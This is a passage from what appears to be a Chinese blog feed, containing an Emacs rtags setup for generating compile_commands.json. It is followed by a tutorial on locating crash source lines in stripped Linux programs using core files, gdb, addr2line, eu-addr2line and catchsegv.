<span style="color: #969896; background-color: #22a224a427a7;"> </span>   (<span style="color: #b5bd68;">while</span> (<span style="color: #b5bd68;">and</span> project-root (not (file-exists-p (concat project-root <span style="color: #8abeb7;">"compile_c</span><span style="color: #8abeb7; text-decoration: underline;">ommands.json"</span><span style="text-decoration: underline;">))))</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span> (<span style="color: #b5bd68;">setq</span> tmp-project-root (file-name-directory (directory-file-name project-r<span style="text-decoration: underline;">oot)))</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span> (message <span style="color: #8abeb7;">"tmp-project-root: %s, project-root: %s"</span> tmp-project-root project<span style="text-decoration: underline;">-root)</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span> (<span style="color: #b5bd68;">if</span> (equal tmp-project-root project-root)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span> (<span style="color: #b5bd68;">setq</span> project-root nil)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   (<span style="color: #b5bd68;">setq</span> project-root tmp-project-root)))
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   (<span style="color: #b5bd68;">unless</span> project-root
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span> (message <span style="color: #8abeb7;">"RTags: compile_commands.json not exists"</span>)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span> (<span style="color: #b5bd68;">setq</span> project-root default-directory))
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   (message <span style="color: #8abeb7;">"RTags: %s"</span> (concat project-root <span style="color: #8abeb7;">"compile_commands.json"</span>))
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   (format <span style="color: #8abeb7;">"rc -J %s --project-root %s"</span> project-root project-root)))

(<span style="color: #b5bd68;">defun</span> <span style="color: #de935f;">my-rtags-run</span> ()
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b294bb;">"rtags startup with generated compile_commands.json"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> (<span style="color: #b5bd68;">interactive</span>)
<span style="color: #969896; background-color: #22a224a427a7;"> </span> (rtags-start-process-unless-running)
<span style="color: #969896; background-color: #22a224a427a7;"> </span> (shell-command (my-rtags-load-compile-commands-command)))

(<span style="color: #b5bd68;">defun</span> <span style="color: #de935f;">my-rtags-build</span> ()
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b294bb;">"rtags startup use compile_commands.json generate from build tool"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> (<span style="color: #b5bd68;">interactive</span>)
<span style="color: #969896; background-color: #22a224a427a7;"> </span> (<span style="color: #b5bd68;">cond</span> ((file-exists-p <span style="color: #8abeb7;">"BUILD"</span>) (my-rtags-bazel))
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   ((file-exists-p <span style="color: #8abeb7;">"CMakeLists.txt"</span>) (my-rtags-cmake))
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   ((file-exists-p <span style="color: #8abeb7;">"Makefile"</span>) (my-rtags-make))
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   (t (<span style="color: #cc6666; font-weight: bold;">error</span> <span style="color: #8abeb7;">"No build tool detected"</span>))))

(<span style="color: #b5bd68;">defun</span> <span style="color: #de935f;">my-rtags-bazel</span> ()
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b294bb;">"rtags startup use compile_commands.json generate from bazel"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> (<span style="color: #b5bd68;">interactive</span>)
<span style="color: #969896; background-color: #22a224a427a7;"> </span> (<span style="color: #b5bd68;">let</span> ((tool_dir <span style="color: #8abeb7;">"~/Opensource/Bazel_and_CompileCommands"</span>)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   (command <span style="color: #8abeb7;">""</span>))
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   (<span style="color: #b5bd68;">setq</span> command (format <span style="color: #8abeb7;">"%s/setup_compile_commands.sh; %s/create_compile_comma</span><span style="color: #8abeb7; text-decoration: underline;">nds.sh //..."</span><span style="text-decoration: underline;"> tool_dir tool_dir))</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   (<span style="color: #b5bd68;">setq</span> command (read-string <span style="color: #8abeb7;">"Build bazel compile_commands.json: "</span> command nil<span style="text-decoration: underline;"> nil))</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   (<span style="color: #b5bd68;">unless</span> command
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span> (<span style="color: #cc6666; font-weight: bold;">error</span> <span style="color: #8abeb7;">"Build compile_commands.json for bazel failed"</span>))
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   (rtags-start-process-unless-running)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   (async-shell-command (concat command <span style="color: #8abeb7;">" &amp;&amp; "</span> (my-rtags-load-compile-commands-<span style="text-decoration: underline;">command)))))</span>

(<span style="color: #b5bd68;">defun</span> <span style="color: #de935f;">my-rtags-make</span> ()
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b294bb;">"build compile_commands.json for make"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> (<span style="color: #b5bd68;">interactive</span>)
<span style="color: #969896; background-color: #22a224a427a7;"> </span> (<span style="color: #b5bd68;">let</span> ((command (read-string <span style="color: #8abeb7;">"Build make compile_commands.json: "</span> <span style="color: #8abeb7;">"bear make"</span> n<span style="text-decoration: underline;">il nil)))</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   (<span style="color: #b5bd68;">unless</span> command
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span> (<span style="color: #cc6666; font-weight: bold;">error</span> <span style="color: #8abeb7;">"Build compile_commands.json for make failed"</span>))
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   (rtags-start-process-unless-running)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   (async-shell-command (concat command <span style="color: #8abeb7;">" &amp;&amp; "</span> (my-rtags-load-compile-commands-<span style="text-decoration: underline;">command)))))</span>

(<span style="color: #b5bd68;">defun</span> <span style="color: #de935f;">my-rtags-cmake</span> ()
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b294bb;">"build compile_commands.json for cmake"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> (<span style="color: #b5bd68;">interactive</span>)
<span style="color: #969896; background-color: #22a224a427a7;"> </span> (<span style="color: #b5bd68;">let</span> ((command (read-string <span style="color: #8abeb7;">"Build cmake compile_commands.json: "</span> <span style="color: #8abeb7;">"cmake -DCMA</span><span style="color: #8abeb7; text-decoration: underline;">KE_EXPORT_COMPILE_COMMANDS=ON ."</span><span style="text-decoration: underline;"> nil nil)))</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   (rtags-start-process-unless-running)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   (async-shell-command (concat command <span style="color: #8abeb7;">" &amp;&amp; "</span> (my-rtags-load-compile-commands-<span style="text-decoration: underline;">command)))))</span>

(<span style="color: #b5bd68;">setq</span> rtags-completions-enabled t)
(eval-after-load 'company
<span style="color: #969896; background-color: #22a224a427a7;"> </span> '(add-to-list
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   'company-backends 'company-rtags))
(<span style="color: #b5bd68;">setq</span> rtags-autostart-diagnostics t)
(rtags-enable-standard-keybindings)
(<span style="color: #b5bd68;">require</span> '<span style="color: #81a2be;">helm-rtags</span>)
(<span style="color: #b5bd68;">require</span> '<span style="color: #81a2be;">flycheck-rtags</span>)
(define-key c-mode-map (kbd <span style="color: #8abeb7;">"C-c C-j"</span>) 'rtags-find-symbol)
(define-key c++-mode-map (kbd <span style="color: #8abeb7;">"C-c C-j"</span>) 'rtags-find-symbol)
(define-key c-mode-map (kbd <span style="color: #8abeb7;">"C-c C-b"</span>) 'rtags-location-stack-back)
(define-key c++-mode-map (kbd <span style="color: #8abeb7;">"C-c C-b"</span>) 'rtags-location-stack-back)
(define-key c-mode-map (kbd <span style="color: #8abeb7;">"C-c C-r"</span>) 'rtags-find-references)
(define-key c++-mode-map (kbd <span style="color: #8abeb7;">"C-c C-r"</span>) 'rtags-find-references)
</pre>
</div>

<p>
第一次需在项目根目录执行 <code>M-x my-rtags-build</code> ，它会先生成编译数据库
（ <code>compile_commands.json</code> ）再启动 rtags 后台服务。以后可直接运行 rtags 后
台服务 <code>M-x my-rtags-run</code> 。
</p>

<p>
现在随便打开项目中的 c++ 源代码，将光标放到变量名上，然后按 <code>C-c C-j</code> 跳转到
定义处，更多用法请参考 rtags 文档。
</p>
</div>
</div>
</div>

<div id="outline-container-org3fb4fe4" class="outline-2">
<h2 id="org3fb4fe4">参考</h2>
<div class="outline-text-2" id="text-org3fb4fe4">
<ul class="org-ul">
<li><a href="https://sarcasm.github.io/notes/dev/compilation-database.html#cmake">Compilation database — Sarcasm notebook</a></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[linux 下调试剥去调试信息的程序崩溃]]></title>
            <link>/article/linux-4e0b8c038bd5526553bb8c038bd54fe1606f76847a0b5e8f5d296e83.html</link>
            <guid>/article/linux-4e0b8c038bd5526553bb8c038bd54fe1606f76847a0b5e8f5d296e83.html</guid>
            <pubDate>Tue, 14 Nov 2017 10:18:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-orgfd10b56" class="outline-2">
<h2 id="orgfd10b56">为什么要剥去调试信息</h2>
<div class="outline-text-2" id="text-orgfd10b56">
<ul class="org-ul">
<li><p>
减少程序文件尺寸
</p>

<p>
剥去掉调试信息后，程序可能只有之前的 1/5 大小，占用的空间更少，下载安装更快。
</p></li>

<li><p>
安全
</p>

<p>
函数、变量名称去掉后能够大大增加逆向工程的难度。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-org4f59004" class="outline-2">
<h2 id="org4f59004">如何添加调试信息</h2>
<div class="outline-text-2" id="text-org4f59004">
<p>
<code>gcc</code> 编译程序时指定 <code>-g</code> 选项。
</p>
</div>
</div>

<div id="outline-container-org396597c" class="outline-2">
<h2 id="org396597c">如何剥去调试信息</h2>
<div class="outline-text-2" id="text-org396597c">
<div class="org-src-container">
<pre class="src src-sh">strip /path/to/app
</pre>
</div>
</div>
</div>

<div id="outline-container-org8720995" class="outline-2">
<h2 id="org8720995">从程序崩溃后产生的 core 文件定位源代码行</h2>
<div class="outline-text-2" id="text-org8720995">
<ul class="org-ul">
<li><p>
示例程序
</p>

<p>
<code>app.c</code>
</p>
<div class="org-src-container">
<pre class="src src-c"><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;unistd.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;stdio.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;stdlib.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;pthread.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;errno.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;stdint.h&gt;</span>

<span style="color: #81a2be;">void</span> <span style="color: #de935f;">bug</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">id</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">illegal pointer, si_code = 128 (send by kernel) </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> printf(<span style="color: #8abeb7;">"[%d] This is bug\n"</span>, id);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">int</span> *<span style="color: #f0c674;">p</span> = (<span style="color: #81a2be;">int</span> *)-1;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> printf(<span style="color: #8abeb7;">"%d\n"</span>, *p);
}

<span style="color: #81a2be;">void</span> <span style="color: #de935f;">extra_func</span>() {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> printf(<span style="color: #8abeb7;">""</span>);
}

<span style="color: #81a2be;">int</span> <span style="color: #de935f;">func_b</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">id</span>)
{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> printf(<span style="color: #8abeb7;">"[%d] This is func_b\n"</span>, id);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> sleep(rand()%5);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> extra_func();
<span style="color: #969896; background-color: #22a224a427a7;"> </span> bug(id);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> extra_func();
}

<span style="color: #81a2be;">int</span> <span style="color: #de935f;">func_a</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">id</span>)
{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> printf(<span style="color: #8abeb7;">"[%d] This is func_a\n"</span>, id);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> sleep(rand()%5);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> extra_func();
<span style="color: #969896; background-color: #22a224a427a7;"> </span> func_b(id);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> extra_func();
}

<span style="color: #81a2be;">void</span>* <span style="color: #de935f;">func</span>(<span style="color: #81a2be;">void</span>* <span style="color: #f0c674;">param</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">id</span> = (<span style="color: #81a2be;">int</span>)param;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> sleep(1);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> extra_func();
<span style="color: #969896; background-color: #22a224a427a7;"> </span> func_a(id);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> extra_func();
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">NULL</span>;
}

<span style="color: #81a2be;">int</span> <span style="color: #de935f;">main</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">argc</span>, <span style="color: #81a2be;">char</span> *<span style="color: #f0c674;">argv</span>[])
{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">i</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">for</span>(i = 0; i &lt; 10; ++i) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">pthread_t</span> <span style="color: #f0c674;">pid</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (0 != pthread_create(&amp;pid, <span style="color: #81a2be;">NULL</span>, func, (<span style="color: #81a2be;">void</span>*)i)) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"create thread %d failed (%d).\n"</span>, errno);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> exit(1);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }
<span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> sleep(100);

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> 0;
}
</pre>
</div>

<p>
编译
</p>

<div class="org-src-container">
<pre class="src src-sh">gcc -g -O2 app.c -lm -lpthread -o app
</pre>
</div></li>

<li><p>
记得保留调试信息
</p>

<p>
一种简单的方法是保留未剥去调试信息前的可执行程序
</p>
<div class="org-src-container">
<pre class="src src-sh">cp app app_debug
strip app
</pre>
</div>

<p>
或者保留调试信息到调试符号文件
</p>
<div class="org-src-container">
<pre class="src src-sh">objcopy --only-keep-debug app app.debug
strip app
objcopy --add-gnu-debuglink=app.debug app
</pre>
</div>
<p>
这种方法在调试时需要将调试符号 <code>app.debug</code> 文件放到当前目录下，
或者在 <code>gdb</code> 中通过 <code>set debug-file-directory /tmp/debug</code> 指定其它目录（如 <code>/tmp/debug</code> ）。
详情请参考 <a href="https://sourceware.org/gdb/onlinedocs/gdb/Separate-Debug-Files.html">Debugging with GDB: Separate Debug Files</a> 。
</p>

<p>
并不是所有工具都和 <code>gdb</code> 一样支持分离的调试符号文件，如 <code>str2line</code> 就不支持，
可以将调试符号文件和 strip 后的可执行程序重新合并成带调试符号的程序
<code>app_debug</code> ：
</p>
<div class="org-src-container">
<pre class="src src-sh">cp ./app.debug ./app_debug
eu-unstrip ./app ./app_debug
</pre>
</div>
<p>
参考 <a href="https://stackoverflow.com/questions/2509301/how-to-reverse-the-objcopys-strip-with-only-keep-debug/38645662#38645662">binutils - How to reverse the objcopy's strip with only-keep-debug? - Stack Overflow</a>
</p></li>

<li><p>
运行程序崩溃产生 core 文件
</p>

<pre class="example">
$ ulimit -c unlimited
$ ./app
[2] This is func_a
[5] This is func_a
[8] This is func_a
[7] This is func_a
[3] This is func_a
[4] This is func_a
[7] This is func_b
[4] This is func_b
[9] This is func_a
[0] This is func_a
[6] This is func_a
[1] This is func_a
[5] This is func_b
[7] This is bug
[5] This is bug
[0] This is func_b
Segmentation fault (core dumped)
</pre>

<p>
以 <code>Archlinux</code> 为例，core 文件由 systemd 接管，提取 core 文件到当前目录下
</p>

<div class="org-src-container">
<pre class="src src-sh">coredumpctl -r -1 -o app.core dump app
</pre>
</div></li>

<li><p>
使用 <code>gdb</code> 从 core 文件获取崩溃调用栈
</p>

<p>
使用 <code>gdb</code> 提取崩溃调用栈使用 strip 掉调试符号的可执行程序即可，因此可以在现场
进行提取。
</p>

<pre class="example">
$ gdb -q --nh --nx --batch -ex bt ./app --core=./app.core
[New LWP 7790]
[New LWP 7783]
[New LWP 7785]
[New LWP 7791]
[New LWP 7786]
[New LWP 7787]
[New LWP 7789]
[New LWP 7784]
[New LWP 7788]
[New LWP 7782]
[New LWP 7792]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Core was generated by `./app'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x000055de44fb79a4 in ?? ()
[Current thread is 1 (Thread 0x7f60834ee700 (LWP 7790))]
#0  0x000055de44fb79a4 in ?? ()
#1  0x000055de44fb7a0b in ?? ()
#2  0x000055de44fb7a65 in ?? ()
#3  0x00007f60872e508a in start_thread () from /usr/lib/libpthread.so.0
#4  0x00007f608701c47f in clone () from /usr/lib/libc.so.6
</pre></li>

<li><p>
使用 <code>eu-addr2line</code> 获取地址对应的代码行
</p>

<pre class="example">
$ eu-addr2line -e ./app_debug --core ./app.core 0x000055de44fb79a4 0x000055de44fb7a0b 0x000055de44fb7a65
/home/tangxinfa/Examples/c/addr2line_demo/app.c:12
/home/tangxinfa/Examples/c/addr2line_demo/app.c:26
/home/tangxinfa/Examples/c/addr2line_demo/app.c:44
</pre>

<p>
<code>app.c:12</code> 正对应产生崩溃的代码行：
</p>
<div class="org-src-container">
<pre class="src src-c">printf(<span style="color: #8abeb7;">"%d\n"</span>, *p);
</pre>
</div>

<p>
但是除了崩溃的位置给出了正确的代码行 <code>app.c:12</code> ，其它两处给出的代码行指向了
函数定义的尾扩号处，如果一个函数有在多个地方调用另一函数，则无法区分具体是哪个
地方的调用引起了崩溃。
</p>

<p>
问题：依赖于 core 文件
</p>

<p>
一般来说崩溃可能发生在不受控的设备里，如果崩溃产生的 core 文件过大则上传会耗时
过长，甚至有的网络环境是按流量收费的，需要找到一种方法直接从可执行程序或其它信
息获取到崩溃的源代码行。
</p></li>

<li><p>
使用 <code>addr2line</code> 获取地址对应的代码行
</p>

<pre class="example">
$ addr2line -e ./app_debug 0x000055de44fb79a4
??:0
</pre>
<p>
使用 addr2line 获取 gdb 输出的调用栈地址对应的源代码行失败了，应该是 addr2line
不支持重定址（relocations）后的地址，程序运行时的地址一般都是重定址过的。这估计
也是前面的 <code>eu-addr2line</code> 工具需要 <code>core</code> 文件的原因，它可以从 core 文件获取信
息拿到重定址前的地址值。
</p>

<p>
<code>gdb</code> 输出的地址需要减去基础地址（base address）才能用于 <code>addr2line</code> ，获取基
础地址的方式有很多种：
</p>

<ul class="org-ul">
<li><p>
读取 <code>/proc/&lt;pid&gt;/maps</code> 文件
</p>

<p>
使用 gdb 调试 core 文件时，程序往往已经结束，可能无法获取。
</p></li>

<li><p>
通过 <code>gdb</code> 的 <code>info target</code> 命令获取
</p>

<p>
可以获得地址映射空间信息，只是对象名称被隐藏了，不方便分析。
</p></li>

<li><p>
通过 <code>gdb</code> 的 <code>info proc mapping</code>
</p>

<p>
获取的地址映射空间信息，很简洁，很容易分析。
</p></li>
</ul>

<p>
获取了地址映射空间地址段信息后，遍历一下所有地址段看 <code>gdb</code> 崩溃堆栈地址在哪个段中，
然后减去该地址段的起始地址，应该就是重定址前的地址值了，如下所示：
</p>

<p>
首先从 core 文件获取地址映射空间
</p>
<pre class="example">
$ gdb -q --nh --nx --batch -ex 'info proc mapping' --core ./app.core
[New LWP 10780]
[New LWP 10771]
[New LWP 10777]
[New LWP 10779]
[New LWP 10778]
[New LWP 10776]
[New LWP 10774]
[New LWP 10773]
[New LWP 10775]
[New LWP 10772]
[New LWP 10781]
Core was generated by `./app'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x0000563b029d09a4 in ?? ()
[Current thread is 1 (LWP 10780)]
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x563b029d0000     0x563b029d1000     0x1000        0x0 /home/tangxinfa/Examples/c/addr2line_demo/app
      0x563b02bd0000     0x563b02bd1000     0x1000        0x0 /home/tangxinfa/Examples/c/addr2line_demo/app
      0x563b02bd1000     0x563b02bd2000     0x1000     0x1000 /home/tangxinfa/Examples/c/addr2line_demo/app
      0x7f9fb40e9000     0x7f9fb4297000   0x1ae000        0x0 /usr/lib/libc-2.26.so
      0x7f9fb4297000     0x7f9fb4497000   0x200000   0x1ae000 /usr/lib/libc-2.26.so
      0x7f9fb4497000     0x7f9fb449b000     0x4000   0x1ae000 /usr/lib/libc-2.26.so
      0x7f9fb449b000     0x7f9fb449d000     0x2000   0x1b2000 /usr/lib/libc-2.26.so
      0x7f9fb44a1000     0x7f9fb44ba000    0x19000        0x0 /usr/lib/libpthread-2.26.so
      0x7f9fb44ba000     0x7f9fb46b9000   0x1ff000    0x19000 /usr/lib/libpthread-2.26.so
      0x7f9fb46b9000     0x7f9fb46ba000     0x1000    0x18000 /usr/lib/libpthread-2.26.so
      0x7f9fb46ba000     0x7f9fb46bb000     0x1000    0x19000 /usr/lib/libpthread-2.26.so
      0x7f9fb46bf000     0x7f9fb480a000   0x14b000        0x0 /usr/lib/libm-2.26.so
      0x7f9fb480a000     0x7f9fb4a09000   0x1ff000   0x14b000 /usr/lib/libm-2.26.so
      0x7f9fb4a09000     0x7f9fb4a0a000     0x1000   0x14a000 /usr/lib/libm-2.26.so
      0x7f9fb4a0a000     0x7f9fb4a0b000     0x1000   0x14b000 /usr/lib/libm-2.26.so
      0x7f9fb4a0b000     0x7f9fb4a30000    0x25000        0x0 /usr/lib/ld-2.26.so
      0x7f9fb4c2f000     0x7f9fb4c30000     0x1000    0x24000 /usr/lib/ld-2.26.so
</pre>

<p>
可以看到崩溃地址 <code>0x0000563b029d09a4</code> 在第一个地址段（ <code>0x563b029d0000
  0x563b029d1000</code> ）中，减去起始地址后的值为 <code>0x9a4</code> ，尝试将该值用于
<code>addr2line</code>
</p>
<pre class="example">
$ addr2line -e ./app_debug 0x9a4
/home/tangxinfa/Examples/c/addr2line_demo/app.c:12
</pre>
<p>
最终找到了正确的源代码行，这样我们通过在生产环境使用 <code>gdb</code> 提取崩溃调用栈以及
地址映射空间，就可以在调试环境进行源代码级的问题定位，而不需要从生产环境取得
core 文件。
</p>

<p>
相关讨论：
</p>

<ul class="org-ul">
<li><a href="https://stackoverflow.com/questions/6934659/how-to-make-backtrace-backtrace-symbols-print-the-function-names">c - How to make backtrace()/backtrace_symbols() print the function names? - Stack Overflow</a></li>

<li><a href="https://www.winehq.org/pipermail/wine-devel/2016-August/114583.html">How to find out the source code function from compiled running address</a></li>

<li><a href="https://www.sourceware.org/ml/gdb/2008-06/msg00043.html">How can I get a memory map out of a core file?</a></li>
</ul></li>
</ul>
</div>
</div>

<div id="outline-container-orgef65dd3" class="outline-2">
<h2 id="orgef65dd3">从程序崩溃后输出的调用栈定位崩溃对应的代码行</h2>
<div class="outline-text-2" id="text-orgef65dd3">
<blockquote>
<p>
libSegFault     The segmentation fault signal handler, used by catchsegv 
</p>
</blockquote>
<p>
引用自 <a href="http://www.linuxfromscratch.org/hlfs/view/development/chapter06/glibc.html">6.9. Glibc-2.12.2</a>
</p>

<blockquote>
<p>
/lib/libSegFault.so是glibc自身提供的一个动态库，我们可以通过LD_PRELOAD环境变量的设置来提前加载它。在这个 环境下程序的SIGSEGV信号都被libSegment.so中的逻辑处理了，并且它会打印出崩溃现场的寄存器信息，堆栈信息，内存map等
</p>
</blockquote>
<p>
引用自 <a href="http://awhite2008.blog.sohu.com/155610926.html">使用libSegFault.so拦截段错误信号-泛舟-搜狐博客</a>
</p>

<p>
本节主要参考 <a href="https://www.quora.com/Does-addr2line-work-in-Linux">Does addr2line work in Linux? - Quora</a>
</p>

<ul class="org-ul">
<li><p>
使用 <code>catchsegv</code> 来运行程序以获取崩溃堆栈信息
</p>

<p>
<code>catchsegv</code> 对 <code>libSegFault.so</code> 进行了封装，如通过设置环境变量将崩溃信息输出到
临时文件避免和程序的错误输出混在一起。
</p>

<pre class="example">
$ catchsegv ./app &gt; ./app.log
$ cat ./app.log
*** Segmentation fault
Register dump:

 RAX: 0000000000000010   RBX: 0000000000000009   RCX: 0000000000000000
 RDX: 00007fb65877e980   RSI: 0000000000000000   RDI: 00007fb65877e980
 RBP: 0000000000000000   R8 : 0000000000000001   R9 : 0000000000000000
 R10: 0000000000000000   R11: 0000000000000000   R12: 00007ffdc4b5a34e
 R13: 00007ffdc4b5a34f   R14: 00007fb65877f700   R15: 0000000000000000
 RSP: 00007fb65877eee0

 RIP: 000055a0ae63e9a4   EFLAGS: 00010206

 CS: 0033   FS: 0000   GS: 0000

 Trap: 0000000e   Error: 00000005   OldMask: 00000000   CR2: ffffffff

 FPUCW: 0000037f   FPUSW: 00000000   TAG: 00000000
 RIP: 00000000   RDP: 00000000

 ST(0) 0000 0000000000000000   ST(1) 0000 0000000000000000
 ST(2) 0000 0000000000000000   ST(3) 0000 0000000000000000
 ST(4) 0000 0000000000000000   ST(5) 0000 0000000000000000
 ST(6) 0000 0000000000000000   ST(7) 0000 0000000000000000
 mxcsr: 1f80
 XMM0:  00000000000000000000000025252525 XMM1:  00000000000000000000000025252525
 XMM2:  00000000000000000000000025252525 XMM3:  00000000000000000000000025252525
 XMM4:  00000000000000000000000025252525 XMM5:  00000000000000000000000025252525
 XMM6:  00000000000000000000000025252525 XMM7:  00000000000000000000000025252525
 XMM8:  00000000000000000000000025252525 XMM9:  00000000000000000000000025252525
 XMM10: 00000000000000000000000025252525 XMM11: 00000000000000000000000025252525
 XMM12: 00000000000000000000000025252525 XMM13: 00000000000000000000000025252525
 XMM14: 00000000000000000000000025252525 XMM15: 00000000000000000000000025252525

Backtrace:
./app(+0x9a4)[0x55a0ae63e9a4]
./app(+0xa0b)[0x55a0ae63ea0b]
./app(+0xa65)[0x55a0ae63ea65]
/usr/lib/libpthread.so.0(+0x708a)[0x7fb65d61808a]
/usr/lib/libc.so.6(clone+0x3f)[0x7fb65d34f47f]

Memory map:

55a0ae63e000-55a0ae63f000 r-xp 00000000 08:02 42863171 /home/tangxinfa/Examples/c/addr2line_demo/app
55a0ae83e000-55a0ae83f000 r--p 00000000 08:02 42863171 /home/tangxinfa/Examples/c/addr2line_demo/app
55a0ae83f000-55a0ae840000 rw-p 00001000 08:02 42863171 /home/tangxinfa/Examples/c/addr2line_demo/app
55a0ae85d000-55a0ae87e000 rw-p 00000000 00:00 0 [heap]
7fb648000000-7fb648021000 rw-p 00000000 00:00 0
7fb648021000-7fb64c000000 ---p 00000000 00:00 0
7fb650000000-7fb650021000 rw-p 00000000 00:00 0
7fb650021000-7fb654000000 ---p 00000000 00:00 0
7fb657d18000-7fb657d2e000 r-xp 00000000 08:12 1644549 /usr/lib/libgcc_s.so.1
7fb657d2e000-7fb657f2d000 ---p 00016000 08:12 1644549 /usr/lib/libgcc_s.so.1
7fb657f2d000-7fb657f2e000 r--p 00015000 08:12 1644549 /usr/lib/libgcc_s.so.1
